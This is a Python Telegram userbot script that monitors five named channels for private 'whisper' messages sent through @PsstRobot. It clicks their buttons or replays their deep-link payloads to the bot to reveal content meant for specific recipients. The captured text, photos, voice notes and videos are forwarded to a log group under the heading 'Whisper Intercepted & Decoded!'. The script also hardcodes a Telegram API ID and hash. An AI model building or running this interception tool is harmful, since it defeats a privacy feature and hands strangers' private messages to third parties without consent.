import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724

# Global context to track media whispers across handlers
context = {"chat_title": "Target Channel", "msg_link": "#", "start_time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== HELPER: GET MESSAGE LINK ====================
async def get_msg_link(event):
    try:
        chat = await event.get_chat()
        if getattr(chat, "username", None):
            return f"https://t.me/{chat.username}/{event.id}"
        clean_id = str(event.chat_id).replace("-100", "")
        return f"https://t.me/c/{clean_id}/{event.id}"
    except:
        return "#"

# ==================== 1. CHANNEL HANDLER ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def channel_handler(event):
    if not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    msg_link = await get_msg_link(event)
    
    print(f"\n📩 WHISPER DETECTED in [{chat_name}]")

    try:
        # A. Check if button has a Deep Link (start=payload)
        payload = None
        for row in event.buttons:
            for btn in row:
                if btn.url and 'PsstRobot?start=' in btn.url:
                    payload = btn.url.split('start=')[-1]
                    break
        
        # B. If no URL, click the button to see if popup gives a link
        res = await event.click(0)
        secret_text = None
        if hasattr(res, 'message') and res.message:
            secret_text = res.message
        elif isinstance(res, str):
            secret_text = res

        # Check if popup has a payload link
        if secret_text and "-wh::" in secret_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", secret_text)
            if match:
                payload = match.group(0)

        # C. Process based on what we found
        if payload or (secret_text and "advanced" in secret_text.lower()):
            print(f"🔗 Advanced Media Whisper found. Triggering Bot DM...")
            context.update({"chat_title": chat_name, "msg_link": msg_link, "start_time": start_time})
            
            # If we have a payload, send it. If not, bot might already be sending media.
            if payload:
                await client.send_message(WHISPER_BOT_ID, f"/start {payload}")
            return

        # D. Normal Text Whisper
        if secret_text:
            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)
            log_payload = (
                f"🔓 **Whisper Intercepted & Decoded!**\n\n"
                f"📝 **Secret Message:**\n{secret_text}\n\n"
                f"📍 **Channel:** {chat_name}\n"
                f"⚡ **Speed:** {elapsed_ms} ms\n"
                f"🔗 [Message Link]({msg_link})"
            )
            await client.send_message(LOG_GROUP_ID, log_payload)
            print(f"✅ Success: Text forwarded.")

    except Exception as e:
        print(f"❌ Error in Channel Handler: {e}")

# ==================== 2. BOT DM HANDLER (MEDIA REDIRECT) ====================
@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    # Ignore startup/setup messages
    if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "/start", "Click the button"]):
        return

    print(f"📩 BOT DM RECEIVED (Advanced Content)!")

    try:
        now = time.perf_counter()
        # If context is too old (>2 mins), reset it
        if now - context["start_time"] > 120:
            context["start_time"] = now

        elapsed_ms = round((now - context["start_time"]) * 1000, 2)
        
        media_type = "Long Message/Media"
        if event.photo: media_type = "Photo"
        elif event.voice: media_type = "Voice Note"
        elif event.video: media_type = "Video"
        
        log_payload = (
            f"🔓 **Whisper Intercepted & Decoded!**\n\n"
            f"📝 **Secret Message:**\n[Advanced {media_type} Whisper]\n"
            f"{event.message.text if event.message.text else ''}\n\n"
            f"📍 **Channel:** {context['chat_title']}\n"
            f"⚡ **Speed:** {elapsed_ms} ms\n"
            f"🔗 [Message Link]({context['msg_link']})"
        )

        await client.send_message(LOG_GROUP_ID, log_payload, file=event.message.media if event.message.media else None)
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Success: Media Whisper forwarded to Group!")

    except Exception as e:
        print(f"❌ Error in DM Handler: {e}")

# ==================== WEB SERVER & STARTUP ====================
async def handle_ping(request): return web.Response(text="Active")
async def main():
    await client.start()
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
    
    print("📡 Syncing dialogs...")
    await client.get_dialogs()
    
    try:
        await client.send_message(LOG_GROUP_ID, "🚀 **Whisper Automator (Media Fix) Online!**")
        print("🟢 Online and Ready.")
    except Exception as e:
        print(f"🔴 Log Group Warning: {e}")

    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
